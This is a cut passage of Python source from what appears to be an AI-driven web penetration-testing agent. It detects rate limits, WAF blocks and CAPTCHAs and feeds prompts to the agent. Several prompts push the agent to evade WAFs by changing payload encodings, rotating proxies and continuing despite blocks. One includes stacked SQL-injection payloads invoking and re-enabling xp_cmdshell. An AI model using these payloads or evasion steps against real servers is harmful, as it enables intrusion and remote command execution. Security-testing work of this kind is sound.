                        "⚠️ [DOOM_LOOP] 检测到重复模式 — 需要换策略。\n"
                        "请尝试以下之一：\n"
                        "1) 切换到其他参数/端点\n"
                        "2) 更换WAF绕过载荷（改变编码）\n"
                        "3) 切换到其他漏洞类型（XSS→LFI等）\n"
                        "4) 更换代理后重试\n"
                        "立即改变策略并继续。"
                    ),
                    "en": (
                        "⚠️ [DOOM_LOOP] Repetitive pattern detected — change strategy now.\n"
                        "Try one of:\n"
                        "1) Switch to a different parameter/endpoint\n"
                        "2) Use different WAF bypass payload (change encoding)\n"
                        "3) Switch to a different vuln type (XSS→LFI etc.)\n"
                        "4) Rotate proxy and retry\n"
                        "Change strategy immediately and continue."
                    ),
                }
                _dl_lang = getattr(self.config, "lang", "en")
                _dl_msg = _dl_escape_map.get(_dl_lang, _dl_escape_map["en"])
                self._dl_escape_attempts += 1
                if self._dl_escape_attempts >= 2:
                    _stop_msg = {
                        "ko": (
                            "⛔ [NO_NEW_PROGRESS_STOP] 새 증거 없이 반복 탐지가 계속되어 자동 종료합니다. "
                            "현재 증거로 보고서를 생성합니다."
                        ),
                        "zh": (
                            "⛔ [NO_NEW_PROGRESS_STOP] 未出现新证据且重复探测持续，自动停止。"
                            "请基于当前证据生成报告。"
                        ),
                        "en": (
                            "⛔ [NO_NEW_PROGRESS_STOP] Repeated probing without new evidence; auto-stopping. "
                            "Generate the report from current evidence."
                        ),
                    }.get(_dl_lang, "⛔ [NO_NEW_PROGRESS_STOP] No new progress; stop and report.")
                    self.console.print(f"[{THEME['warn']}]{_stop_msg}[/]")
                    self.history.append(Message(role="user", content=_stop_msg + "\nTASK_COMPLETE"))
                    self._loop_limit_hit = True
                    self._agent_stop_flag.set()
                    break
                self.history.append(Message(role="user", content=_dl_msg))
                self._dl_tool_sigs.clear()
                self._dl_no_progress = 0
            # ─────────────────────────────────────────────────────────────────

            # ── v6.2.159 Self-Reflection 주기적 자기평가 (Type A) ─────────────
            if getattr(self, "_intel_ready", False):
                try:
                    if self._self_reflector.should_reflect(self._exec_loop_count):
                        _hist_texts = [
                            m.content for m in self.history[-40:]
                            if hasattr(m, "content") and isinstance(m.content, str)
                        ]
                        _tgt = self._agent_state.get("target", "?")
                        _found_v = self._self_reflector.extract_found_vulns(_hist_texts)
                        _failed_t = self._self_reflector.extract_failed_tools(_hist_texts)
                        _reflect_msg = self._self_reflector.build_reflection_prompt(
                            self._exec_loop_count,
                            _found_v,
                            _failed_t,
                            _tgt,
                            self._task_graph if self._task_graph._nodes else None,
                        )
                        self.history.append(Message(role="user", content=_reflect_msg))
                        self.console.print(
                            f"\n[bold magenta]{_reflect_msg.splitlines()[0]}[/bold magenta]"
                        )
                except Exception:
                    pass

            # ── v6.2.159 SubAgent 완료 결과 수집 → 히스토리 주입 ─────────────
            if getattr(self, "_intel_ready", False):
                try:
                    _done_agents = self._subagent_pool.collect_done()
                    if _done_agents:
                        from ..core.intelligence import _nl as _intel_nl
                        for _sa in _done_agents:
                            _sa_label = _intel_nl(
                                f"✅ [서브에이전트 완료] {_sa.task_id}: {_sa.task_desc}",
                                f"✅ [子代理完成] {_sa.task_id}: {_sa.task_desc}",
                                f"✅ [SubAgent done] {_sa.task_id}: {_sa.task_desc}",
                            )
                            _sa_content = (
                                f"{_sa_label}\n"
                                + (_sa.output if _sa.status == "done" else f"ERROR: {_sa.error}")
                            )
                            self.history.append(Message(role="user", content=_sa_content))
                            self.console.print(f"\n[bold green]{_sa_label}[/bold green]")
                except Exception:
                    pass
            # ─────────────────────────────────────────────────────────────────

            # ── v6.2.125: 루프 과다 자동 차단 (Type A) ───────────────────────
            # 동일 세션에서 60루프 이상 돌면 AI가 루프에 갇힌 것으로 판단 → 강제 중단
            _MAX_LOOP = 60
            if self._exec_loop_count >= _MAX_LOOP:
                from ..i18n import t as _t_loop, set_lang as _sl_loop, get_lang as _gl_loop
                _loop_stop_msg = "\n" + _t_loop(
                    "loop_limit_stop",
                    f"⛔ [LOOP_LIMIT_STOP] Loop #{self._exec_loop_count} — auto-stopping.",
                ).format(count=self._exec_loop_count)
                self.console.print(_loop_stop_msg)
                # v6.2.137: hint 프롬프트 없이 완전 종료 — _loop_limit_hit 플래그로 구분
                self._exec_loop_count = 0
                self._loop_limit_hit = True   # hint 없이 break하도록 표시
                self._agent_stop_flag.set()
            # ─────────────────────────────────────────────────────────────────

            # 루프마다 세션 자동 저장 (이어하기용)
            self._save_history()
            # ── v3.2.71: target memory 자동 업데이트 ──────────────────────────
            # 실행 결과에서 SQLi 포인트, 유저, 엔드포인트를 자동 추출해 저장.
            # 다음 세션 시작 시 _offer_resume 에서 이 데이터를 AI에 주입.
            if self._tm_available:
                try:
                    import re as _tm_re
                    _tgt_key = self._agent_state.get("target", "")
                    _raw_scan = raw_results
                    if _tgt_key and _raw_scan:
                        # Only the exporter evidence ladder can authorize a
                        # confirmed SQLi memory entry.  Raw words such as
                        # "sqli" or "size diff" are candidate evidence only.
                        _sqli_confirmed = any(
                            getattr(_f, "vuln_type", "") == "sqli"
                            and getattr(_f, "confidence", "") == "confirmed"
                            and bool(getattr(_f, "confirmed", False))
                            for _f in getattr(self._findings_exporter, "findings", [])
                        )
                        if _sqli_confirmed:
                            _u = _tm_re.search(r'https?://[^\s\'",]{10,}', _raw_scan)
                            _p = _tm_re.search(r'(?:param(?:eter)?|파라미터)[=:\s]*([a-zA-Z_][a-zA-Z0-9_]{1,30})', _raw_scan, _tm_re.I)
                            self._tm_sqli(
                                _tgt_key,
                                _u.group(0) if _u else _tgt_key,
                                _p.group(1) if _p else "unknown",
                                "GET", None, None, "confirmed"
                            )
                        # 유저 확인 키워드 → users 저장
                        _user_m = _tm_re.findall(
                            r'(?:user(?:name|id)?|아이디|계정)[=:\s]*[\"\']?([a-zA-Z0-9_\-]{3,20})[\"\']?.*?(?:exist|exists|found|확인|존재)',
                            _raw_scan, _tm_re.I
                        )
                        if _user_m:
                            self._tm_users(_tgt_key, list(set(_user_m)))
                except Exception:
                    pass

            # ── IP 차단 / Rate Limit 자동 감지 및 대기 ────────────────────
            # ⚠️  v3.2.4: 오탐 방지 강화
            #   - "429" 단독 소문자 매칭 제거 → HTTP 컨텍스트 regex 필수
            #   - 이유: smali const-string, HTML id, 쿼리스트링 등 수천 곳에
            #           "429"가 무관하게 등장해 Rate Limit 오탐이 발생했음
            #   - "blocked", "banned", "access denied" 도 맥락 없이 HTML 본문에서
            #     오탐 가능 → HTTP 응답 라인 또는 에러 메시지 패턴에서만 감지
            _ip_block_hint = ""
            _raw_lower = raw_results.lower()
            import re as _bre

            # ── v4.6.0: 오탐 제로 IP 차단 감지 ────────────────────────────────
            # 핵심 원칙: 실제 HTTP 차단 응답에서만 발동. 응답 본문 텍스트 오탐 금지.
            #
            # [오탐 사례]
            #   - 사이트 HTML에 "rate limit policy", "API rate limit" 등 단어 포함
            #     → _has_ratelimit 발동 → 실제 차단 없는데 15초 대기
            #   - "response...429" 에서 response와 429 사이에 긴 HTML 본문이 끼어 매칭
            #   - "error 429" 가 스크립트 내부 주석이나 변수명에서 매칭
            #
            # [v4.6.0 수정]
            #   1. _has_429: response.*429 → response[^\n]{0,80}429 (같은 줄 80자 이내)
            #   2. _has_ratelimit: "rate limit" 단독 제거 → 에러 컨텍스트 필수
            #      (exceeded/reached/hit/error/throttle/block 등이 함께 있어야 발동)
            #   3. _detected_blocks 단일 신호 Rate limit hit → IPBlockDetector 교차검증
            #      실제로 사이트 접근 가능하면 오탐으로 판단, 차단 무효화

            # 정확한 HTTP 429 패턴 — 같은 줄 80자 이내 컨텍스트 필수
            _has_429 = bool(_bre.search(
                r'(?:'
                r'status[:\s]+429'               # "status: 429"
                r'|http/\d[.\d]*\s+429'          # "HTTP/1.1 429"
                r'|\[\s*429\s*\]'                # "[429]"
                r'|response[^\n]{0,80}429'       # "response code: 429" (같은 줄 80자 이내)
                r'|error[:\s]+429'               # "error: 429" (콜론/공백 필수)
                r'|code[=:\s]+429'               # "code=429"
                r'|429.*too.many'                # "429 Too Many"
                r'|too\.many\.requests'          # "Too Many Requests" (정확한 HTTP 구문)
                r')',
                _raw_lower,
            ))

            # "rate limit" — 에러 컨텍스트 필수 (단독 단어는 오탐)
            # 오탐 제거: 사이트 본문에 "rate limit policy", "rate limit docs" 포함해도 발동 안 함
            # 발동 조건: "rate limit exceeded", "rate limit error", "rate limit hit", 등
            _has_ratelimit = bool(_bre.search(
                r'rate[\s_-]?limit\s*(?:exceeded|reached|hit|error|blocked|throttl|denied|violat)'
                r'|rate[\s_-]?limit.*(?:429|too[\s_]many|forbidden|block)'
                r'|(?:429|too[\s_]many|throttl).*rate[\s_-]?limit'
                r'|x-rate-limit-remaining[:\s]+0'       # HTTP 헤더: Remaining=0
                r'|retry-after[:\s]+\d',                # HTTP 헤더: Retry-After
                _raw_lower,
            ))

            # 403 — "403 forbidden" 패턴 (단순 "403" 숫자는 제외)
            # v5.2.6: CORS/인증 관련 403은 IP 차단 아님 → CORS 헤더 동반 시 제외
            _has_403_raw = bool(_bre.search(
                r'(?:403\s+forbidden|status[:\s]+403|http/\d[.\d]*\s+403)', _raw_lower))
            # CORS 또는 인증 관련 403인지 판별 (API endpoint 접근 거부는 IP 차단 아님)
            _has_cors_403 = _has_403_raw and bool(_bre.search(
                r'access-control-allow-origin'
                r'|access-control-allow-credentials'
                r'|vary[:\s]+origin'
                r'|www-authenticate[:\s]'  # 인증 요구 헤더 = auth 403
                r'|401\s+unauthorized',    # 같은 출력에 401도 있으면 인증 문제
                _raw_lower,
            ))
            _has_403 = _has_403_raw and not _has_cors_403

            # 503
            _has_503 = bool(_bre.search(
                r'(?:503\s+service|status[:\s]+503|http/\d[.\d]*\s+503)', _raw_lower))

            # 연결 오류 — 충분히 명확한 exception 메시지들
            _has_conn = bool(_bre.search(
                r'(?:connectionrefused|connection\s+refused'
                r'|connectionreset|connection\s+reset\s+by\s+peer)',
                _raw_lower,
            ))

            # 타임아웃 — requests exception 클래스명 기준
            _has_timeout = bool(_bre.search(
                r'(?:readtimeout|connecttimeout|requests.*timed\s+out'
                r'|socket\.timeout|connectiontimeout)',
                _raw_lower,
            ))

            # "blocked" / "banned" / "access denied" — HTML id/class가 아닌
            # 에러 메시지 맥락에서만 (e.g., "[BLOCKED]", "IP blocked", "access denied")
            _has_blocked = bool(_bre.search(
                r'(?:\bip\s+block(?:ed|ing)\b'
                r'|\[blocked\]'
                r'|your\s+(?:ip|request|access).*block'
                r'|access\s+denied'
                r'|you\s+have\s+been\s+ban'
                r'|\bip\s+ban(?:ned)?\b)',
                _raw_lower,
            ))

            _has_unavail = bool(_bre.search(
                r'temporarily\s+unavailable', _raw_lower))

            _detected_blocks: list[str] = []
            if _has_429:
                _detected_blocks.append("Rate limit (429) detected")
            if _has_ratelimit and not _has_429:
                # v4.6.0: Rate limit 단독 신호 → IPBlockDetector 교차검증
                # 사이트가 실제로 접근 가능하면 오탐 → 차단 무효화
                _rl_target = self._agent_state.get("target", "") or getattr(self.config, "target", "")
                _rl_confirmed = True  # 기본 발동 (교차검증 실패 시 폴백)
                if _rl_target:
                    try:
                        from ..core.ip_block_detector import IPBlockDetector as _IPBD
                        _rl_detector = _IPBD(_rl_target)
                        _rl_result = _rl_detector.check()
                        if not _rl_result.blocked:
                            # 사이트 실제 접근 가능 → 텍스트 패턴 오탐
                            _lang_rl = getattr(self.config, "lang", "en")
                            _rl_fp_msg = self.s.get("rate_limit_fp_suppressed", {
                                "ko": "⚡ 'rate limit' 텍스트 감지됐지만 실제 차단 없음 (오탐 억제)",
                                "zh": "⚡ 检测到'rate limit'文本但实际无封锁（误报已抑制）",
                                "en": "⚡ 'rate limit' text detected but site accessible — false positive suppressed",
                            })
                            if isinstance(_rl_fp_msg, dict):
                                _rl_fp_msg = _rl_fp_msg.get(_lang_rl, "⚡ Rate limit text FP suppressed")
                            self.console.print(f"[dim]{_rl_fp_msg}[/]")
                            _rl_confirmed = False
                    except Exception:
                        pass  # 교차검증 실패 → 안전하게 발동 유지
                if _rl_confirmed:
                    _detected_blocks.append("Rate limit hit")
            if _has_403:
                # v5.2.6: 403도 IPBlockDetector 교차검증 — 메인 사이트 접근 가능하면 오탐
                _403_target = self._agent_state.get("target", "") or getattr(self.config, "target", "")
                _403_confirmed = True
                if _403_target:
                    try:
                        from ..core.ip_block_detector import IPBlockDetector as _IPBD403
                        _403_detector = _IPBD403(_403_target)
                        _403_result = _403_detector.check()
                        if not _403_result.blocked:
                            # 메인 사이트 접근 가능 → IP 전체 차단은 아님.
                            # 단, endpoint별 권한 거부/행동형 WAF/rate-state는 모두 가능하다.
                            _lang_403 = getattr(self.config, "lang", "en")
                            _403_fp_msg = self.s.get("forbidden_403_not_ipblock", {
                                "ko": "⚡ 403 감지됐지만 메인 사이트 접근 가능 — 전체 IP 차단 아님; endpoint 권한 거부 또는 WAF/rate-state 가능",
                                "zh": "⚡ 检测到403但主站可访问 — 非全站IP封锁；可能是端点权限拒绝或WAF/rate状态",
                                "en": "⚡ 403 detected but main site accessible — not a site-wide IP block; endpoint denial or WAF/rate-state possible",
                            })
                            if isinstance(_403_fp_msg, dict):
                                _403_fp_msg = _403_fp_msg.get(_lang_403, "⚡ 403 endpoint denial or WAF/rate-state (not site-wide IP block)")
                            self.console.print(f"[dim]{_403_fp_msg}[/]")
                            _403_confirmed = False
                    except Exception:
                        pass  # 교차검증 실패 → 안전하게 발동 유지
                if _403_confirmed:
                    _detected_blocks.append("403 Forbidden — possible IP block")
            if _has_503:
                _detected_blocks.append("503 Service Unavailable")
            if _has_conn:
                _detected_blocks.append("Connection refused/reset")
            if _has_timeout:
                _detected_blocks.append("Request timeout — possible WAF silent drop")
            if _has_blocked:
                # ── v4.9.3: WAF 페이로드 차단 vs 실제 IP 차단 구분 (강화) ──────────
                # 이전(v4.9.2): 루트(/) 1개 체크 → 루트도 WAF 차단 시 IP 차단으로 오판
                # 개선: 루트 + /robots.txt + /favicon.ico 3개 시도 → 하나라도 200이면 WAF 차단
                #       모두 실패해도 실제 연결 자체가 되면(비-4xx 응답) WAF 차단으로 처리
                _hb_target = self._agent_state.get("target", "") or getattr(self.config, "target", "")
                _hb_is_real_ipblock = True  # 기본 발동 (검증 실패 시 안전하게 유지)
                if _hb_target:
                    try:
                        import httpx as _hb_hx
                        _hb_base = _hb_target if "://" in _hb_target else f"https://{_hb_target}"
                        _hb_base = _hb_base.rstrip("/")
                        # 검증 경로: 루트 → /robots.txt → /favicon.ico
                        _hb_probe_paths = ["/", "/robots.txt", "/favicon.ico"]
                        _hb_accessible = False
                        _hb_any_response = False  # 연결 자체는 됨 (WAF가 422/406 등 반환)
                        for _hb_path in _hb_probe_paths:
                            try:
                                _hb_resp = _hb_hx.get(
                                    _hb_base + _hb_path,
                                    headers={"User-Agent": "Mozilla/5.0 (compatible; probe/1.0)"},
                                    follow_redirects=True,
                                    timeout=5,
                                    verify=False,
                                )
                                _hb_any_response = True
                                # 200-399: 정상 접근 가능 → IP 차단 아님
                                if 200 <= _hb_resp.status_code < 400:
                                    _hb_accessible = True
                                    break
                                # 서버가 응답은 함(4xx 포함) → 완전 연결 불가는 아님
                            except (_hb_hx.ConnectError, _hb_hx.ConnectTimeout):
                                # 연결 자체 실패 → 다음 경로 시도
                                continue
                            except Exception:
                                _hb_any_response = True  # 읽기 오류도 연결은 된 것
                                break
                        # 하나라도 정상 응답 OR 서버가 응답 자체는 함 → WAF 페이로드 차단
                        if _hb_accessible or _hb_any_response:
                            _hb_is_real_ipblock = False
                            _lang_hb = getattr(self.config, "lang", "en")
                            _hb_fp_msg = self.s.get("waf_payload_blocked_not_ip", {
                                "ko": "⚡ 'blocked' 감지됐지만 서버 응답 정상 — WAF 페이로드 차단 (IP 차단 아님)",
                                "zh": "⚡ 检测到'blocked'但服务器正常响应 — WAF载荷拦截（非IP封锁）",
                                "en": "⚡ 'blocked' text but server responds — WAF payload block, NOT IP block",
                            }).get(_lang_hb, "⚡ WAF payload block (not IP block)")
                            self.console.print(f"[dim]{_hb_fp_msg}[/]")
                            _detected_blocks.append("WAF payload blocked (not IP block)")
                    except Exception:
                        pass  # 검증 예외 → 안전하게 IP 차단으로 유지
                if _hb_is_real_ipblock:
                    _detected_blocks.append("IP block/ban detected")
            if _has_unavail:
                _detected_blocks.append("Temporarily unavailable")

            # ── v6.2.16: WAF 보안도메인 302 → 페이로드 차단 (IP 차단 아님) ───────────────
            # igear, securecp, cloudbric 등으로 리다이렉트 = WAF가 그 페이로드를 차단한 것.
            # "IP 전체 차단"이 아님! 다른 페이로드/헤더/쿠키로 재시도 가능.
            _waf_redirect_note = ""
            _waf_sec_domains = [
                "igear.co.kr", "securecp.co.kr", "cloudbric.", "sitelock.",
                "sucuri.", "incapsula.", "/secure/index", "/blocked", "/deny",
            ]
            _has_waf_sec_redirect = any(
                f"location: http" in _raw_lower and d in _raw_lower
                for d in _waf_sec_domains
            )
            if _has_waf_sec_redirect:
                import re as _wrex
                _waf_loc = _wrex.search(r'location:\s*(\S+)', _raw_lower)
                _waf_loc_url = _waf_loc.group(1) if _waf_loc else "unknown"
                _lang_wr = getattr(self.config, "lang", "en")
                _waf_redirect_note = (
                    f"\n[WAF_PAYLOAD_BLOCK — NOT IP BLOCK]\n"
                    f"302 Redirect → {_waf_loc_url}\n"
                    f"This is a WAF payload-level block. Your IP is NOT banned.\n"
                    f"The WAF blocked THIS SPECIFIC PAYLOAD/PATTERN.\n"
                    f"REQUIRED ACTIONS:\n"
                    f"  1. Get session cookies first: curl -sc /tmp/c.txt -sk -A 'Mozilla/5.0' 'TARGET/' -o /dev/null\n"
                    f"  2. Retry with cookies: curl -b /tmp/c.txt -sk 'TARGET/page?param=PAYLOAD'\n"
                    f"  3. Change payload: try encoding, case variation, comment insertion\n"
                    f"  4. Try different bypass: /**/ instead of space, 0x41 instead of 'A'\n"
                    f"DO NOT say 'IP blocked — change VPN'. Keep trying with payload variations."
                )
                self.console.print(
                    f"[{THEME['warn']}]  {self.s.get('waf_payload_block_hint', '⚡ WAF payload block detected (NOT IP ban) → retry with modified payload')}[/]"
                )

            # ── CAPTCHA 오탐 방지 v3.2.16 ─────────────────────────────────────
            # 문제: _raw_lower에 AI 스크립트 출력 HTML이 포함됨
            #       → HTML 안의 <script src="...recaptcha..."> 태그 때문에 오탐 발생
            #       → 오탐 시 AI가 "CAPTCHA triggered → slow mode" 잘못 판단
            # 해결: script src URL, 순수 URL 문자열 제거 후 실제 챌린지 패턴만 검사
            import re as _cre
            # 1단계: script src에 recaptcha/captcha/hcaptcha 포함된 태그 제거
            _body_for_captcha = _cre.sub(
                r'<script[^>]*src=["\'][^"\']*(?:recaptcha|captcha|hcaptcha)[^"\']*["\'][^>]*(?:></script>|/>|>)',
                '', _raw_lower,
            )
            # 2단계: URL 문자열로만 나타나는 recaptcha 제거 (JS 변수, href 등)
            _body_for_captcha = _cre.sub(
                r'https?://[^\s"\'<>\r\n]*(?:recaptcha|captcha\.google|hcaptcha\.com)[^\s"\'<>\r\n]*',
                '', _body_for_captcha,
            )
            # 3단계: 실제 CAPTCHA 챌린지만 엄격 감지
            _captcha_block = bool(_cre.search(
                r'(?:'
                # 사용자에게 표시되는 실제 CAPTCHA 안내 문구
                r'captcha\s+(?:required|verification\s+required|blocked|error)'
                r'|(?:enter|complete|fill|solve)\s+(?:the\s+)?captcha'
                r'|verify\s+you(?:\'re|\s+are)\s+(?:human|not\s+a\s+robot)'
                r'|please\s+(?:complete|solve)\s+(?:the\s+)?(?:captcha|security\s+check)'
                # Cloudflare 실제 챌린지 페이지 고유 문구
                r'|just\s+a\s+moment\.\.\.'
                r'|checking\s+your\s+browser'
                r'|cf-challenge|cf_chl_prog'
                r'|enable\s+javascript\s+and\s+cookies\s+to\s+continue'
                r'|cf-turnstile[^>]{0,60}data-sitekey'
                # reCAPTCHA/hCaptcha 실제 인터랙션 요소 (data-sitekey 동반 시만)
                r'|(?:g-recaptcha|h-captcha)[^>]{0,80}data-sitekey'
                r'|data-hcaptcha-widget-id'
                r')',
                _body_for_captcha,
            ))
            if _captcha_block:
                _detected_blocks.append("CAPTCHA detected")

            # VBScript 에러 감지 — SQL 인젝션 시도 중단 신호
            _vbscript_no_sqli_patterns = [
                ("800a01a8", "VBScript Error 800a01a8 (Object required — NOT SQLi)"),
                ("800a0d5d", "VBScript Error 800a0d5d (ADODB Type mismatch — PARAMETERIZED, NOT injectable)"),
                ("8002000a", "VBScript Error 8002000a (ADO stream error — NOT SQLi)"),
                ("800a000d", "VBScript Error 800a000d (Type mismatch — NOT SQLi)"),
            ]
            _vbscript_signals = [
                label for sig, label in _vbscript_no_sqli_patterns if sig in _raw_lower
            ]
            # 진짜 OLE DB SQL 에러 패턴 — 이것들이 있으면 VBScript 경고 억제
            # (같은 배치 결과에 두 종류가 섞여 있을 수 있음)
            _real_sqli_sigs = ["80040e14", "80040e07", "80040e01", "80040e21", "80040e23"]
            _has_real_sqli_err = any(sig in _raw_lower for sig in _real_sqli_sigs)

            if _vbscript_signals and not _has_real_sqli_err:
                # 진짜 SQL 에러 없음 → 순수 VBScript 파라미터화된 에러 → 경고 출력
                _vb_title = t("vbscript_not_sqli_title", "⚠️  VBScript error detected — these parameters are NOT SQL injectable")
                _vb_detail = t("vbscript_not_sqli_detail", "Detected: {signals}\n→ NOT injectable\n→ STOP testing this parameter.").replace("{signals}", ", ".join(_vbscript_signals[:2]))
                self.console.print(f"[{THEME['warn']}]{_vb_title}[/]")
                self.console.print(f"[{THEME['dim']}]{_vb_detail}[/]")
                _ip_block_hint += (
                    f"\n[VBSCRIPT_ERROR_DETECTED: {'; '.join(_vbscript_signals)}]\n"
                    "ACTION REQUIRED: STOP testing these parameters for SQL injection.\n"
                    "  - Error 800a01a8 = Object required (VBScript logic error, not SQLi)\n"
                    "  - Error 800a0d5d = ADODB type mismatch = PARAMETERIZED QUERY = NOT injectable\n"
                    "  - Error 8002000a = ADO stream error = NOT SQLi\n"
                    "Mark these parameters as SAFE / PARAMETERIZED and move to different endpoints.\n"
                    "Do NOT waste more loops on these VBScript errors.\n"
                )
            elif _vbscript_signals and _has_real_sqli_err:
                # 같은 배치에 VBScript 에러 + 진짜 OLE DB SQL 에러 혼재
                # → VBScript 경고 억제, AI에게 혼합 결과임을 알림
                _ip_block_hint += (
                    "\n[MIXED_SQLI_RESULT: VBScript errors AND real OLE DB SQL errors both present]\n"
                    "INTERPRETATION: Different parameters have different injection status.\n"
                    "  - Parameters triggering 800a01a8/800a0d5d → parameterized → NOT injectable\n"
                    "  - Parameters triggering 80040e14/80040e07 → REAL SQL error → INJECTABLE!\n"
                    "FOCUS on the parameters that returned 80040e14 or 80040e07 errors.\n"
                    "DO NOT apply VBScript 'stop testing' rule to the 80040e1x parameters.\n"
                )

            # ADODB 800a0cc1 감지 — Stacked Query 실행 가능 신호
            if "800a0cc1" in _raw_lower:
                _stacked_msg = t("stacked_query_detected", "⚡ ADODB 800a0cc1 detected — stacked query executing!")
                self.console.print(f"[bold green]{_stacked_msg}[/]")
                _ip_block_hint += (
                    "\n[STACKED_QUERY_OPPORTUNITY: ADODB 800a0cc1 detected]\n"
                    "CRITICAL: Semicolon-stacked queries ARE executing on this endpoint!\n"
                    "The 800a0cc1 error = ADO tried to read a column from a SELECT result but failed.\n"
                    "This means the second statement ran but returned an unexpected recordset.\n"
                    "NEXT STEPS:\n"
                    "  1. Try side-effect stacked queries (no SELECT result needed):\n"
                    "     payload = '4; EXEC master..xp_cmdshell 0x77686f616d69--'\n"
                    "     payload = '4; INSERT INTO #tmp SELECT @@version--'\n"
                    "  2. If xp_cmdshell disabled, try enabling:\n"
                    "     payload = '4; EXEC sp_configure 0x73686f77206164...,1; RECONFIGURE--'\n"
                    "  3. Use error-based to extract from stacked: CAST(@@version AS int)\n"
                    "DO NOT use SELECT in stacked queries — it causes the 800a0cc1 recordset error.\n"
                )

            # 무한 루프 경고 — 같은 SQL 데이터값이 반복 출력 감지
            # ⚠️  v3.2.5: 오탐 방지 강화
            #   - "消息: alert", "URL: index_mobile.aspx" 같은 분석 출력 라인 제외
            #   - 4글자 이하 단어(alert, ok, no, yes, true, false 등) 제외
            #   - 흔한 웹/JS/HTML 키워드는 SQL 데이터로 취급하지 않음
            #   - URL/파일경로/파일확장자 패턴을 가진 값은 SQL 데이터로 취급하지 않음
            #   - 오직 의미 있는 SQL 데이터 추출값(≥5자, 비UI 키워드, 비URL)만 감지
            # ⚠️  v3.2.7: URL 패턴 오탐 수정
            # ⚠️  v3.2.9: XML/HTML/JSON 콘텐츠 오탐 수정
            # ⚠️  v3.2.11: 스크립트 오류 메시지 오탐 수정
            # ⚠️  v3.2.12: 이모지/중국어 분석 상태 출력 오탐 예방적 수정
            import re as _re
            _UI_PREFIXES = (
                "消息:", "message:", "msg:", "메시지:", "알림:", "info:",
                "alert:", "warn:", "error:", "status:", "状态:", "상태:",
                "result:", "결과:", "output:", "출력:", "log:", "로그:",
                # v3.2.7: URL/링크 출력 접두어
                "url:", "URL:", "链接:", "링크:", "link:", "Link:",
                "→ http", "→ https", "→ ./", "→ //",
                # v3.2.9: XML/HTML/JSON 출력 접두어
                "<?xml", "xmlns", "<!--", "-->", "<!",
                "<url", "<loc", "<lastmod", "<priority", "<urlset",
                "<sitemap", "<sitemapindex",
                # v3.2.11: 스크립트 실행 오류 메시지 접두어 (오탐 방지)
                "获取失败:", "执行失败:", "请求失败:", "连接失败:", "解析失败:",
                "fetch failed:", "request failed:", "error:", "exception:",
                "traceback", "Traceback", "re.error:", "ValueError:",
                "TypeError:", "AttributeError:", "bad character",
                "取得失敗:", "실행실패:", "오류:", "에러:",
                # v3.2.12: 중국어 분석 상태 접두어 (AI 스크립트 출력, SQL 데이터 아님)
                "检测到:", "发现:", "正在", "扫描:", "探测:", "获取:",
                "分析:", "提取:", "识别:", "确认:", "验证:", "测试:",
                "尝试:", "执行:", "请求:", "处理:", "加载:", "解析:",
                "响应:", "返回:", "输出:", "统计:", "汇总:", "报告:",
                # v3.2.12: Python 예외 클래스명 (오류 반복 출력 오탐 방지)
                "ConnectionError", "SSLError", "HTTPError", "TimeoutError",
                "RequestException", "urllib3", "ssl.", "socket.",
                "requests.exceptions", "http.client",
                "ModuleNotFoundError", "ImportError", "NameError",
                "KeyError:", "IndexError:", "RuntimeError:",
                # v3.2.12: 분석 진행 상태 표시
                "phase ", "Phase ", "阶段", "단계", "step ", "Step ",
                "total:", "Total:", "总计:", "합계:", "count:", "Count:",
                "found:", "Found:", "발견:", "detected:", "Detected:",
                # v3.2.17: HTTP 응답 바디 접두어 오탐 방지
                # 'Body: <!DOCTYPE html>'이 여러 엔드포인트 순환 테스트 시 반복 → 루프 오탐
                "body:", "Body:", "body: <", "Body: <",
                "<!doctype", "<!DOCTYPE",
                "response body:", "Response Body:", "응답체:", "응답바디:",
                "响应体:", "响应内容:", "返回体:", "请求体:",
                # v3.6.6: 'Response (403): <!DOCTYPE html>' WAF 차단 응답 오탐 방지
                # WAF가 AND/UNION/SLEEP 등 다수 페이로드를 403으로 차단 시
                # "Response (403): <!DOCTYPE html>" 이 5회 이상 반복 → 무한루프 오탐 발생
                # 실제 무한루프(SQL TOP 1 커서 없음)와 WAF 차단 패턴을 구분
                "Response (", "response (",
                # v3.2.17: HTTP 상태코드 + 크기 출력 패턴 (예: [GET] /path → 200/1234B)
                "[get] ", "[post] ", "[put] ", "[delete] ", "[patch] ",
                "[GET] ", "[POST] ", "[PUT] ", "[DELETE] ", "[PATCH] ",
                "→ 200", "→ 302", "→ 301", "→ 404", "→ 403", "→ 500",
                "→ 401", "→ 307", "→ 308", "→ 400",
                # v3.2.19: 네트워크 연결 오류 반복 출력 오탐 방지
                # '失败: ('Connection aborted.', RemoteDisconnected...)' 5회 반복 → 루프 오탐
                # WAF가 연결을 강제 종료할 때 정상적인 복수 페이로드 테스트 중 발생
                "失败:", "失败：",          # 중국어 실패 접두어 (단독형)
                "('connection aborted", "('Connection aborted",
                "remoteDisconnected", "RemoteDisconnected",
                "connection reset", "Connection reset", "Connection Reset",
                "connectionreseterror", "ConnectionResetError",
                "connection refused", "Connection refused",
                "read timeout", "Read timeout", "ReadTimeout",
                "connect timeout", "Connect timeout", "ConnectTimeout",
                "max retries exceeded", "Max retries exceeded",
                "failed:", "Failed:",    # 영문 실패 접두어 (단독형)
                "실패:", "실패：",         # 한국어 실패 접두어
            )
            _UI_KEYWORDS = {
                "alert", "error", "ok", "yes", "no", "true", "false",
                "none", "null", "undefined", "success", "fail", "failed",
                "warning", "warn", "info", "debug", "notice", "done",
                "complete", "completed", "finish", "finished", "end",
                "start", "begin", "pass", "skip", "ignore", "n/a",
                "200", "404", "500", "400", "401", "403",
            }
            # v3.2.28: 루프 감지 양성 필터 — 상태/오류 키워드 화이트리스트 제외
            # 이 키워드가 포함된 라인은 DB 추출값이 아닌 스크립트 실행 상태/오류 메시지
            # 블랙리스트 방식의 한계를 보완하는 양성(화이트리스트) 레이어
            _LOOP_STATUS_KEYWORDS: frozenset = frozenset({
                # English — 네트워크/실행 오류
                "error", "failed", "failure", "timeout", "refused",
                "connection", "exception", "traceback", "unknown",
                "invalid", "unauthorized", "forbidden", "not found",
                "aborted", "disconnected", "reset", "socket", "ssl",
                "warning", "retries", "exceeded", "blocked", "unreachable",
                "unavailable", "bad gateway", "service unavailable",
                "internal server", "request failed", "fetch failed",
                # Korean
                "오류", "실패", "에러", "연결", "타임아웃", "차단",
                "거부", "경고", "접속", "비정상", "불가", "실행실패",
                "응답없음", "연결끊김",
                # Chinese
                "错误", "失败", "连接", "拒绝", "超时", "异常",
                "断开", "警告", "阻断", "不可用", "执行失败", "无法连接",
            })
            # v3.2.7: URL/경로 패턴 감지
            _URL_PATTERN = _re.compile(
